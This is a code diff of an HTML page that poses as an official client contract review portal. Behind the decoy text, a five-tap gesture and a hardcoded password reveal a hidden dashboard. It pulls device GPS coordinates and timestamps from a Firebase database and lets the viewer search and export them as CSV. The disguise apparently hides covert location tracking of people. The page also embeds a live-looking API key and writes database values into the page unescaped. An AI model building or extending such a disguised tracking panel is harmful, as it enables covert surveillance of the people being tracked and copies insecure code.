@@ -1,145 +1,108 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Client Project Portal</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Client Contract Page</title>
   <style>
     body {
-      font-family: "Segoe UI", sans-serif;
-      background: #f4f4f4;
       margin: 0;
-      padding: 0;
-    }
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f7f7f7;
+      color: #333;
+      overflow-x: hidden;
+    }.viewer {
+  padding: 2rem;
+  text-align: center;
+  animation: fadeIn 2s ease-in-out;
+}
 
-    header {
-      background-color: #222;
-      color: #fff;
-      padding: 20px;
-      text-align: center;
-      font-size: 1.4em;
-      letter-spacing: 1px;
-    }
+.viewer h1 {
+  font-size: 1.8rem;
+  font-weight: bold;
+}
 
-    .contract-section {
-      padding: 20px;
-      max-width: 900px;
-      margin: auto;
-    }
+.viewer p {
+  margin: 1rem 0;
+  font-size: 1rem;
+}
 
-    .contract-section h2 {
-      color: #222;
-      border-bottom: 2px solid #ddd;
-      padding-bottom: 5px;
-    }
+.admin {
+  display: none;
+  background-color: #111;
+  color: #fff;
+  padding: 1rem;
+  animation: fadeInUp 1s ease-in-out;
+}
 
-    .contract-section p {
-      font-size: 1rem;
-      color: #444;
-      line-height: 1.6;
-    }
+table {
+  width: 100%;
+  border-collapse: collapse;
+  margin-top: 1rem;
+  font-size: 0.9rem;
+}
 
-    #admin-panel {
-      display: none;
-      background: #fff;
-      margin: 30px auto;
-      padding: 20px;
-      max-width: 1000px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
+th, td {
+  border: 1px solid #444;
+  padding: 0.5rem;
+  text-align: center;
+}
 
-    .table-container {
-      overflow-x: auto;
-      margin-top: 20px;
-    }
+th {
+  background-color: #222;
+}
 
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      font-size: 0.95rem;
-    }
+.controls {
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+  margin-top: 10px;
+}
 
-    table, th, td {
-      border: 1px solid #ccc;
-    }
+.controls input, .controls button {
+  padding: 10px;
+  border-radius: 4px;
+  border: none;
+  font-size: 1rem;
+}
 
-    th, td {
-      padding: 10px;
-      text-align: left;
-    }
+.controls button {
+  background: #2196F3;
+  color: #fff;
+  cursor: pointer;
+}
 
-    th {
-      background-color: #eee;
-    }
+.daily-log-count {
+  margin-top: 1rem;
+  font-weight: bold;
+  color: #0f0;
+}
 
-    #searchInput {
-      padding: 10px;
-      width: 100%;
-      margin-bottom: 10px;
-      border: 1px solid #aaa;
-      border-radius: 5px;
-    }
+@keyframes fadeIn {
+  0% { opacity: 0; transform: translateY(-20px); }
+  100% { opacity: 1; transform: translateY(0); }
+}
 
-    .hidden-password {
-      display: none;
-      margin-top: 10px;
-    }
+@keyframes fadeInUp {
+  0% { opacity: 0; transform: translateY(30px); }
+  100% { opacity: 1; transform: translateY(0); }
+}
 
-    .hidden-password input {
-      padding: 10px;
-      width: 100%;
-    }
-
-    .export-btn {
-      margin: 10px 0;
-      padding: 8px 16px;
-      background: #007bff;
-      border: none;
-      color: white;
-      cursor: pointer;
-      border-radius: 5px;
-    }
-
-    footer {
-      text-align: center;
-      font-size: 0.8em;
-      color: #aaa;
-      padding: 20px 0;
-    }
   </style>
 </head>
 <body>
-
-<header>Client Project Portal</header>
-
-<div class="contract-section">
-  <h2>Client Requirements</h2>
-  <p>All specifications must be approved and timestamped.</p>
-
-  <h2>Terms and Review</h2>
-  <p>Final review will be automatically saved and verified upon access.</p>
-
-  <h2>Legal & Compliance</h2>
-  <p>Ensure full adherence to documentation agreements.</p>
-</div>
-
-<!-- Hidden Admin Trigger -->
-<div id="admin-trigger" style="height: 300px;"></div>
-
-<!-- Admin Login -->
-<div class="hidden-password" id="password-box">
-  <input type="password" id="adminPass" placeholder="Enter contract PIN...">
-</div>
-
-<!-- Admin Panel -->
-<div id="admin-panel">
-  <h2>Admin Dashboard</h2>
-  <input type="text" id="searchInput" placeholder="Filter search...">
-  <button class="export-btn" onclick="downloadCSV()">Export CSV</button>
-
-  <div class="table-container">
-    <table id="locationTable">
+  <div class="viewer" id="viewer">
+    <h1>Official Contract Review Portal</h1>
+    <p>This portal serves as a formal client interaction hub. Contract reviews are logged daily for compliance and transparency.</p>
+    <p>Please verify client documents, updates, and contractual engagement policies.</p>
+    <p>Generated and timestamped data logs are processed and stored securely for auditing purposes.</p>
+  </div>  <div class="admin" id="admin">
+    <h2>Admin Dashboard</h2>
+    <div class="controls">
+      <input type="text" id="searchInput" placeholder="Search by device or location...">
+      <button onclick="exportCSV()">Export as CSV</button>
+    </div>
+    <div class="daily-log-count" id="dailyCount">Daily logs: 0</div>
+    <table id="logTable">
       <thead>
         <tr>
           <th>Device</th>
@@ -148,105 +111,96 @@
           <th>Timestamp</th>
         </tr>
       </thead>
-      <tbody id="tableBody">
-        <!-- Data will auto-load -->
-      </tbody>
+      <tbody></tbody>
     </table>
-  </div>
-  <p>This page is protected by a secure contract interface.</p>
-</div>
+  </div>  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.5.2/firebase-app.js";
+    import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.5.2/firebase-database.js";
 
-<footer>Smart Contract Verification Portal © 2025</footer>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
+      authDomain: "gps-d0bab.firebaseapp.com",
+      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
+      projectId: "gps-d0bab",
+      storageBucket: "gps-d0bab.appspot.com",
+      messagingSenderId: "810816177909",
+      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
+    };
 
-<!-- Firebase SDK -->
-<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
+    const locationRef = ref(database, 'locations');
 
-<script>
-  // ✅ Real Firebase config
-  const firebaseConfig = {
-    apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
-    authDomain: "gps-d0bab.firebaseapp.com",
-    databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
-    projectId: "gps-d0bab",
-    storageBucket: "gps-d0bab.appspot.com",
-    messagingSenderId: "810816177909",
-    appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
-  };
+    const tableBody = document.querySelector("#logTable tbody");
+    const dailyCountEl = document.getElementById("dailyCount");
 
-  firebase.initializeApp(firebaseConfig);
-  const db = firebase.database().ref();
-
-  // 5x tap + scroll detection
-  let tapCount = 0;
-  document.getElementById('admin-trigger').addEventListener('click', () => {
-    tapCount++;
-    if (tapCount >= 5) {
-      document.getElementById("password-box").style.display = "block";
+    function formatDate(ts) {
+      const d = new Date(ts);
+      return d.toLocaleDateString() + ' ' + d.toLocaleTimeString();
     }
-  });
 
-  document.getElementById("adminPass").addEventListener("keyup", function (e) {
-    if (e.key === "Enter") {
-      if (this.value === "ASCII") {
-        document.getElementById("admin-panel").style.display = "block";
-        this.style.display = "none";
-      } else {
-        alert("Wrong PIN");
-      }
+    function exportCSV() {
+      let csv = 'Device,Latitude,Longitude,Timestamp\n';
+      document.querySelectorAll("#logTable tbody tr").forEach(row => {
+        const cols = [...row.children].map(td => td.textContent);
+        csv += cols.join(',') + '\n';
+      });
+      const blob = new Blob([csv], { type: 'text/csv' });
+      const link = document.createElement('a');
+      link.href = URL.createObjectURL(blob);
+      link.download = 'logs.csv';
+      link.click();
     }
-  });
 
-  // Fetch and display data
-  db.on("value", (snapshot) => {
-    const tableBody = document.getElementById("tableBody");
-    tableBody.innerHTML = "";
+    function filterTable(keyword) {
+      const rows = document.querySelectorAll("#logTable tbody tr");
+      rows.forEach(row => {
+        row.style.display = [...row.children].some(td => td.textContent.toLowerCase().includes(keyword)) ? '' : 'none';
+      });
+    }
 
-    snapshot.forEach((childSnapshot) => {
-      const device = childSnapshot.key;
-      const data = childSnapshot.val();
+    onValue(locationRef, snapshot => {
+      const data = snapshot.val();
+      tableBody.innerHTML = '';
+      let countToday = 0;
+      const today = new Date().toDateString();
 
-      if (data.latitude && data.longitude && data.timestamp) {
+      Object.values(data || {}).forEach(entry => {
+        const ts = new Date(entry.timestamp).toDateString();
+        if (ts === today) countToday++;
+
         const row = `
           <tr>
-            <td>${device}</td>
-            <td>${data.latitude}</td>
-            <td>${data.longitude}</td>
-            <td>${data.timestamp}</td>
+            <td>${entry.device || 'Unknown'}</td>
+            <td>${entry.latitude}</td>
+            <td>${entry.longitude}</td>
+            <td>${formatDate(entry.timestamp)}</td>
           </tr>`;
         tableBody.innerHTML += row;
+      });
+
+      dailyCountEl.textContent = `Daily logs: ${countToday}`;
+    });
+
+    document.getElementById("searchInput").addEventListener("input", e => filterTable(e.target.value.toLowerCase()));
+
+    // 5-tap reveal logic + password entry
+    let tapCount = 0;
+    let tapTimer = null;
+    document.body.addEventListener("click", () => {
+      tapCount++;
+      if (tapTimer) clearTimeout(tapTimer);
+      tapTimer = setTimeout(() => tapCount = 0, 1500);
+      if (tapCount >= 5) {
+        const pass = prompt("Enter admin password:");
+        if (pass === "ASCII") {
+          document.getElementById("viewer").style.display = "none";
+          document.getElementById("admin").style.display = "block";
+        } else {
+          alert("Wrong password.");
+        }
+        tapCount = 0;
       }
     });
-  });
-
-  // Filter search
-  document.getElementById("searchInput").addEventListener("keyup", function () {
-    const filter = this.value.toLowerCase();
-    const rows = document.querySelectorAll("#locationTable tbody tr");
-
-    rows.forEach(row => {
-      const match = row.innerText.toLowerCase().includes(filter);
-      row.style.display = match ? "" : "none";
-    });
-  });
-
-  // Export CSV
-  function downloadCSV() {
-    const rows = document.querySelectorAll("table tr");
-    let csv = "";
-    rows.forEach(row => {
-      const cols = row.querySelectorAll("td, th");
-      const line = Array.from(cols).map(td => `"${td.innerText}"`).join(",");
-      csv += line + "\n";
-    });
-
-    const blob = new Blob([csv], {type: "text/csv"});
-    const url = URL.createObjectURL(blob);
-    const link = document.createElement("a");
-    link.download = "location_logs.csv";
-    link.href = url;
-    link.click();
-  }
-</script>
-</body>
+  </script></body>
   </html>
